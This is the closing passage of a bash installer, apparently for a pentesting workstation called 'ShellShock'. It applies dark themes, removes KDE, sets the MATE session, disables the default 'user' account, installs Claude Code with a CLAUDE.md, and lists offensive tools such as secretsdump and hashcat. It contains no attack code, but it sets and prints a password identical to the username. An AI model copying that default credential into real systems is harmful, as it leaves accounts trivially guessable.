        DEBIAN_FRONTEND=noninteractive apt-get install -y -qq "$pkg" 2>&1 | tee -a "$LOG_FILE" && \
            log_info "Installed: $pkg" || \
            log_warn "Could not install: $pkg (non-critical)"
    fi
done

# Write GTK3 dark theme config directly (no DBUS needed)
log_info "Writing GTK3 dark theme config..."
mkdir -p "$USER_HOME/.config/gtk-3.0"
cat > "$USER_HOME/.config/gtk-3.0/settings.ini" << 'EOF'
[Settings]
gtk-application-prefer-dark-theme=1
gtk-theme-name=BlackMATE
gtk-icon-theme-name=Papirus-Dark
gtk-font-name=Sans 10
EOF

# GTK4
mkdir -p "$USER_HOME/.config/gtk-4.0"
cat > "$USER_HOME/.config/gtk-4.0/settings.ini" << 'EOF'
[Settings]
gtk-application-prefer-dark-theme=1
gtk-theme-name=BlackMATE
gtk-icon-theme-name=Papirus-Dark
gtk-font-name=Sans 10
EOF

# Write MATE dconf overrides directly to keyfile (no live session needed)
log_info "Writing MATE dconf keyfile overrides..."
mkdir -p /etc/dconf/db/local.d
cat > /etc/dconf/db/local.d/01-mate-theme << 'EOF'
[org/mate/interface]
gtk-theme='BlackMATE'
icon-theme='Papirus-Dark'
font-name='Sans 10'

[org/mate/marco/general]
theme='BlackMATE'

[org/mate/background]
picture-filename='/usr/share/backgrounds/parrot/parrot.jpg'
picture-options='zoom'
color-shading-type='solid'
primary-color='#0a0e14'
EOF

# Update dconf database
if command_exists dconf; then
    dconf update 2>/dev/null || true
    log_info "dconf database updated"
fi

# Qt dark mode
mkdir -p "$USER_HOME/.config/qt5ct"
cat > "$USER_HOME/.config/qt5ct/qt5ct.conf" << 'EOF'
[Appearance]
color_scheme_path=/usr/share/qt5ct/colors/darker.conf
style=Adwaita-Dark
EOF

# Create an autostart script that fires gsettings on first login
# This catches anything dconf missed due to no live session
log_info "Creating theme-apply autostart script..."
mkdir -p "$USER_HOME/.config/autostart"
cat > "$USER_HOME/.config/autostart/shellshock-theme.desktop" << 'EOF'
[Desktop Entry]
Type=Application
Name=ShellShock Theme Apply
Exec=/bin/bash /home/PLACEHOLDER/.config/shellshock-theme-apply.sh
Hidden=false
NoDisplay=true
X-MATE-Autostart-Phase=Desktop
EOF
# Replace placeholder with actual username
sed -i "s|PLACEHOLDER|$USERNAME|g" "$USER_HOME/.config/autostart/shellshock-theme.desktop"

# Write the actual theme apply script
cat > "$USER_HOME/.config/shellshock-theme-apply.sh" << 'THEMEOF'
#!/bin/bash
# ShellShock - Apply MATE theme on first login
# Runs once via autostart to set gsettings with live DBUS

FLAGFILE="$HOME/.config/.shellshock-theme-applied"
[[ -f "$FLAGFILE" ]] && exit 0

# Apply MATE theme
gsettings set org.mate.interface gtk-theme 'BlackMATE' 2>/dev/null || \
    gsettings set org.mate.interface gtk-theme 'Adwaita-dark' 2>/dev/null || true
gsettings set org.mate.interface icon-theme 'Papirus-Dark' 2>/dev/null || true
gsettings set org.mate.Marco.general theme 'BlackMATE' 2>/dev/null || \
    gsettings set org.mate.Marco.general theme 'Adwaita-dark' 2>/dev/null || true

# Set wallpaper — prefer HTB/Parrot themed ones
WALLPAPER=""
for wp in \
    /usr/share/backgrounds/hackthebox.jpg \
    /usr/share/backgrounds/htb.jpg \
    /usr/share/backgrounds/htb-alt.jpg \
    /usr/share/backgrounds/parrot-abstract.jpg \
    /usr/share/backgrounds/parrot-glitch.jpg \
    /usr/share/backgrounds/parrot-splash.jpg \
    /usr/share/backgrounds/macaw.jpg \
    /usr/share/backgrounds/*.jpg; do
    if [[ -f "$wp" ]]; then
        WALLPAPER="$wp"
        break
    fi
done

if [[ -n "$WALLPAPER" ]]; then
    gsettings set org.mate.background picture-filename "$WALLPAPER" 2>/dev/null || true
    gsettings set org.mate.background picture-options 'zoom' 2>/dev/null || true
fi

# Apply HTB terminal colors and set as default profile
if command -v mate-terminal &>/dev/null; then
    # Create HTB-Pwnbox profile
    PROFILE_LIST=$(gsettings get org.mate.terminal.global profile-list 2>/dev/null || echo "['default']")
    if [[ ! "$PROFILE_LIST" =~ "htb-pwnbox" ]]; then
        NEW_LIST=$(echo "$PROFILE_LIST" | sed "s/]$/, 'htb-pwnbox']/")
        gsettings set org.mate.terminal.global profile-list "$NEW_LIST" 2>/dev/null || true
    fi

    gsettings set org.mate.terminal.profile:/org/mate/terminal/profiles/htb-pwnbox/ visible-name 'HTB Pwnbox' 2>/dev/null || true
    gsettings set org.mate.terminal.profile:/org/mate/terminal/profiles/htb-pwnbox/ use-theme-colors false 2>/dev/null || true
    gsettings set org.mate.terminal.profile:/org/mate/terminal/profiles/htb-pwnbox/ background-color '#0a0e14' 2>/dev/null || true
    gsettings set org.mate.terminal.profile:/org/mate/terminal/profiles/htb-pwnbox/ foreground-color '#9fef00' 2>/dev/null || true
    gsettings set org.mate.terminal.profile:/org/mate/terminal/profiles/htb-pwnbox/ bold-color '#9fef00' 2>/dev/null || true
    gsettings set org.mate.terminal.profile:/org/mate/terminal/profiles/htb-pwnbox/ use-system-font false 2>/dev/null || true
    gsettings set org.mate.terminal.profile:/org/mate/terminal/profiles/htb-pwnbox/ font 'Monospace 11' 2>/dev/null || true
    gsettings set org.mate.terminal.profile:/org/mate/terminal/profiles/htb-pwnbox/ palette '#0a0e14:#ff3333:#9fef00:#ffaf00:#0a84ff:#ff6ac1:#5ccfe6:#ffffff:#555555:#ff6666:#9fef00:#ffcc00:#0a84ff:#ff6ac1:#5ccfe6:#ffffff' 2>/dev/null || true

    # Set HTB-Pwnbox as the default profile so every terminal opens with it
    gsettings set org.mate.terminal.global default-profile 'htb-pwnbox' 2>/dev/null || true
fi

# Force live session to reload theme and wallpaper
if command -v mate-settings-daemon &>/dev/null; then
    pkill -x mate-settings-daemon 2>/dev/null || true
    sleep 1
    mate-settings-daemon &
fi

# Mark as applied
touch "$FLAGFILE"
THEMEOF

chmod +x "$USER_HOME/.config/shellshock-theme-apply.sh"
chown -R "$USERNAME":"$USERNAME" \
    "$USER_HOME/.config/gtk-3.0" \
    "$USER_HOME/.config/gtk-4.0" \
    "$USER_HOME/.config/qt5ct" \
    "$USER_HOME/.config/autostart/shellshock-theme.desktop" \
    "$USER_HOME/.config/shellshock-theme-apply.sh" \
    2>/dev/null || true

log_success "Desktop theme configured — will fully apply on next login"

# ============================================
# PHASE 15: FINAL SYSTEM CONFIGURATION
# ============================================
log_section "Phase 15: Final System Configuration"

# Remove KDE/Plasma if present — it hijacks the session from MATE
# IMPORTANT: autoremove is intentionally NOT used here — it pulls shared
# deps like network-manager as collateral. Purge only explicit KDE packages.
log_info "Checking for KDE/Plasma packages..."
KDE_PACKAGES=(
    "kde-plasma-desktop"
    "plasma-desktop"
    "plasma-workspace"
    "kde-standard"
    "kde-full"
    "kubuntu-desktop"
    "sddm"
    "plasma-nm"
    "plasma-pa"
    "kwin-x11"
    "kwin-common"
    "kdeconnect"
    "konsole"
)

# Packages that must never be removed regardless of KDE deps
PROTECTED_PACKAGES=(
    "network-manager"
    "network-manager-gnome"
    "caja"
    "caja-common"
    "mate-desktop"
    "mate-panel"
    "mate-session-manager"
    "mate-settings-daemon"
    "lightdm"
)

# Pin protected packages before touching anything
log_info "Pinning protected packages before KDE removal..."
for pkg in "${PROTECTED_PACKAGES[@]}"; do
    if dpkg -l "$pkg" 2>/dev/null | grep -q "^ii"; then
        apt-mark hold "$pkg" 2>/dev/null || true
    fi
done

KDE_FOUND=()
for pkg in "${KDE_PACKAGES[@]}"; do
    if dpkg -l "$pkg" 2>/dev/null | grep -q "^ii"; then
        KDE_FOUND+=("$pkg")
    fi
done

if [[ ${#KDE_FOUND[@]} -gt 0 ]]; then
    log_warn "KDE/Plasma packages found, removing: ${KDE_FOUND[*]}"
    DEBIAN_FRONTEND=noninteractive apt-get purge -y "${KDE_FOUND[@]}" 2>&1 | tee -a "$LOG_FILE" || true
    log_info "KDE/Plasma removed"
else
    log_skip "No KDE/Plasma packages found"
fi

# Unpin protected packages
log_info "Releasing protected package pins..."
for pkg in "${PROTECTED_PACKAGES[@]}"; do
    apt-mark unhold "$pkg" 2>/dev/null || true
done

# Verify network-manager survived — reinstall if missing
if ! dpkg -l network-manager 2>/dev/null | grep -q "^ii"; then
    log_warn "network-manager missing after KDE removal — reinstalling..."
    DEBIAN_FRONTEND=noninteractive apt-get install -y network-manager 2>&1 | tee -a "$LOG_FILE"
    systemctl enable NetworkManager 2>/dev/null || true
    systemctl start NetworkManager 2>/dev/null || true
    log_info "network-manager restored"
else
    log_info "network-manager intact"
fi

# Ensure mate-terminal is installed and set as default
log_info "Setting mate-terminal as default terminal..."
if ! dpkg -l mate-terminal 2>/dev/null | grep -q "^ii"; then
    DEBIAN_FRONTEND=noninteractive apt-get install -y mate-terminal 2>&1 | tee -a "$LOG_FILE"
fi
update-alternatives --set x-terminal-emulator /usr/bin/mate-terminal 2>/dev/null || \
    update-alternatives --install /usr/bin/x-terminal-emulator x-terminal-emulator /usr/bin/mate-terminal 50 2>/dev/null || true
log_info "mate-terminal set as default"

# Enforce MATE as the default session in LightDM
log_info "Configuring LightDM to default to MATE session..."
if [[ -f /etc/lightdm/lightdm.conf ]]; then
    # Set autologin session and greeter default to MATE
    if grep -q "^\[Seat\|^\[seat" /etc/lightdm/lightdm.conf; then
        sed -i '/^\[Seat/,/^\[/ s/^#*user-session=.*/user-session=mate/' /etc/lightdm/lightdm.conf
        if ! grep -q "^user-session=mate" /etc/lightdm/lightdm.conf; then
            sed -i '/^\[Seat/a user-session=mate' /etc/lightdm/lightdm.conf
        fi
    else
        echo "" >> /etc/lightdm/lightdm.conf
        echo "[Seat:*]" >> /etc/lightdm/lightdm.conf
        echo "user-session=mate" >> /etc/lightdm/lightdm.conf
    fi
    log_info "LightDM user-session set to mate"
else
    # Create config from scratch
    mkdir -p /etc/lightdm
    cat > /etc/lightdm/lightdm.conf << 'EOF'
[Seat:*]
user-session=mate
EOF
    log_info "LightDM config created with MATE session"
fi

# Also set the user's default session via AccountsService
mkdir -p /var/lib/AccountsService/users
if [[ -f "/var/lib/AccountsService/users/$USERNAME" ]]; then
    # Update existing entry
    if grep -q "^Session=" "/var/lib/AccountsService/users/$USERNAME"; then
        sed -i 's/^Session=.*/Session=mate/' "/var/lib/AccountsService/users/$USERNAME"
    else
        sed -i '/^\[User\]/a Session=mate' "/var/lib/AccountsService/users/$USERNAME"
    fi
else
    cat > "/var/lib/AccountsService/users/$USERNAME" << EOF
[User]
Session=mate
SystemAccount=false
EOF
fi
log_info "AccountsService session set to MATE for $USERNAME"

# Write .dmrc as final fallback — this is what the session picker reads
echo "[Desktop]
Session=mate" > "$USER_HOME/.dmrc"
chown "$USERNAME":"$USERNAME" "$USER_HOME/.dmrc"
log_info ".dmrc set to MATE session"

# Ensure Caja always manages the MATE desktop on login
log_info "Configuring Caja desktop autostart..."
AUTOSTART_DIR="$USER_HOME/.config/autostart"
mkdir -p "$AUTOSTART_DIR"
cat > "$AUTOSTART_DIR/caja-desktop.desktop" << 'EOF'
[Desktop Entry]
Type=Application
Name=Caja Desktop Manager
Exec=caja --force-desktop
Hidden=false
NoDisplay=false
X-MATE-Autostart-Phase=Desktop
X-MATE-Autostart-Notify=true
EOF
chown -R "$USERNAME":"$USERNAME" "$AUTOSTART_DIR"
log_info "Caja desktop autostart configured"

# Final permission check
chown -R "$USERNAME":"$USERNAME" "$USER_HOME"
log_success "Verified ownership of $USER_HOME"

# Disable built-in 'user' account if exists
if id "user" &>/dev/null && [[ "$USERNAME" != "user" ]]; then
    log_info "Disabling built-in 'user' account..."

    # Lock password
    usermod -L user

    # Expire account
    usermod -e 1 user

    # Set shell to nologin
    usermod -s /usr/sbin/nologin user

    # Hide from display manager
    mkdir -p /var/lib/AccountsService/users
    cat > /var/lib/AccountsService/users/user << 'EOF'
[User]
SystemAccount=true
EOF

    log_success "'user' account disabled"
fi


# ============================================
# PHASE 16: CLAUDE CODE CLI
# ============================================
log_section "Phase 16: Installing Claude Code CLI"

if command_exists claude; then
    log_skip "Claude Code already installed: $(claude --version 2>/dev/null | head -1)"
else
    log_info "Installing Claude Code..."
    if command_exists npm; then
        if npm install -g @anthropic-ai/claude-code 2>&1 | tee -a "$LOG_FILE"; then
            log_success "Claude Code installed: $(claude --version 2>/dev/null | head -1)"
        else
            log_warn "Claude Code npm install failed — try: npm install -g @anthropic-ai/claude-code"
        fi
    else
        log_warn "npm not available — skipping Claude Code install (run: npm install -g @anthropic-ai/claude-code)"
    fi
fi

# Drop default CLAUDE.md template if none exists in home
if [[ ! -f "$USER_HOME/CLAUDE.md" ]]; then
    cat > "$USER_HOME/CLAUDE.md" << 'EOFCLAUDE'
# ShellShock Environment — Claude Code Standing Instructions

## Context
This is a pentesting workstation running the ShellShock framework on Parrot/Kali.
Tools live in ~/tools/, engagements in ~/engagements/, wordlists in ~/wordlists/.

## Autonomy
Claude can freely read, edit, and run commands. Always get explicit permission before:
- Touching /etc/ or system files outside the engagement scope
- Running scans against any IP (confirm target scope first)
- Deleting engagement data

## Engagement workflow
- Create new: htb-new <machine>
- Navigate: htb <machine>
- Serve files: cd ~/engagements/<machine>/www && serve 8000
EOFCLAUDE
    chown "$USERNAME":"$USERNAME" "$USER_HOME/CLAUDE.md"
    log_info "Default CLAUDE.md created at $USER_HOME/CLAUDE.md"
fi

# ============================================
# PHASE 17: COMPLETION
# ============================================
log_section "Phase 17: Installation Complete"

echo ""
log_info "Quick verification summary..."

# Check Bash Default Shell Status
if [[ "$(getent passwd "$USERNAME" | cut -d: -f7)" == "/bin/bash" ]]; then
    echo -e "${GREEN}✓${NC} Bash Default Shell: Set"
else
    echo -e "${YELLOW}⚠${NC} Bash shell configuration will apply after login"
fi

GO_TOOL_COUNT=$(ls "$USER_HOME/go/bin" 2>/dev/null | wc -l)
echo -e "${GREEN}✓${NC} Go tools: $GO_TOOL_COUNT installed"

REPO_COUNT=$(ls -d "$USER_HOME/tools/repos"/*/ 2>/dev/null | wc -l)
echo -e "${GREEN}✓${NC} Repositories: $REPO_COUNT cloned"

WIN_BIN_COUNT=$(ls "$USER_HOME/tools/windows"/*.exe 2>/dev/null | wc -l)
echo -e "${GREEN}✓${NC} Windows binaries: $WIN_BIN_COUNT files"

clear
echo -e "${GREEN}"
cat << 'EOF_FINAL'
╔═══════════════════════════════════════════════════════════════╗
║         SHELLSHOCK — INSTALLATION COMPLETE               ║
╚═══════════════════════════════════════════════════════════════╝
EOF_FINAL
echo -e "${NC}\n"

echo -e "${YELLOW}Account:${NC} ${GREEN}$USERNAME${NC} | ${YELLOW}Password:${NC} ${GREEN}$USERNAME${NC}"
echo ""
echo -e "${CYAN}✓ Installed:${NC}"
echo -e "  • Go 1.23.3 + security tools"
echo -e "  • Bash shell with HTB Pwnbox color scheme"
echo -e "  • John the Ripper + Hashcat"
[[ "$IS_VIRTUALBOX" == "true" ]] && echo -e "  • VirtualBox Guest Additions"
echo -e "  • Impacket + QoL shortcuts"
echo -e "  • HTB workflow automation"
echo -e "  • 70+ pentesting tools"
echo ""
echo -e "${CYAN}📖 Documentation & Scripts:${NC}"
echo -e "  ${GREEN}~/Desktop/SHELLSHOCK-DOCS/${NC}"
echo -e "  ${GREEN}~/Desktop/ShellShock-Scripts/${NC} - Supplemental utilities"
echo ""
echo -e "${YELLOW}💡 Quick Start:${NC}"
echo -e "  ${GREEN}htb-new${NC} machine       # Create HTB engagement"
echo -e "  ${GREEN}secretsdump${NC}           # No more 'impacket-' prefix!"
echo -e "  ${GREEN}serve${NC}                 # Quick HTTP server"
echo ""
echo -e "${YELLOW}⚠  Post-Install Setup:${NC}"
echo -e "  ${GREEN}~/.config/htb-terminal-setup.sh${NC}   # Apply HTB Pwnbox terminal colors"
echo -e "  ${GREEN}shellshock-darkmode.sh${NC} from ShellShock-Scripts (system dark mode)"
echo ""

# Special message if 'user' account was disabled
if id "user" &>/dev/null && [[ "$USERNAME" != "user" ]]; then
    if ! passwd -S user 2>/dev/null | grep -q "P"; then
        echo -e "${RED}⚠  Important:${NC} Default 'user' account disabled"
        echo -e "   Log in as: ${GREEN}$USERNAME${NC}"
        echo ""
    fi
fi

echo -e "${RED}⚠  Reboot required${NC} for all changes (VBox Guest Additions, shell config, etc.)"
echo ""

read -p "Reboot now? (y/n): " -n 1 -r
echo ""
if [[ $REPLY =~ ^[Yy]$ ]]; then
    echo -e "\n${YELLOW}Rebooting in 5 seconds...${NC}"
    sleep 5
    reboot
else
    echo -e "\n${YELLOW}Remember to:${NC}"
    echo -e "  1. ${GREEN}sudo reboot${NC}"
    echo -e "  2. Log in as ${GREEN}$USERNAME${NC} (password: ${GREEN}$USERNAME${NC})"
    echo -e "\n${CYAN}Happy hunting! 🎯${NC}\n"
fi
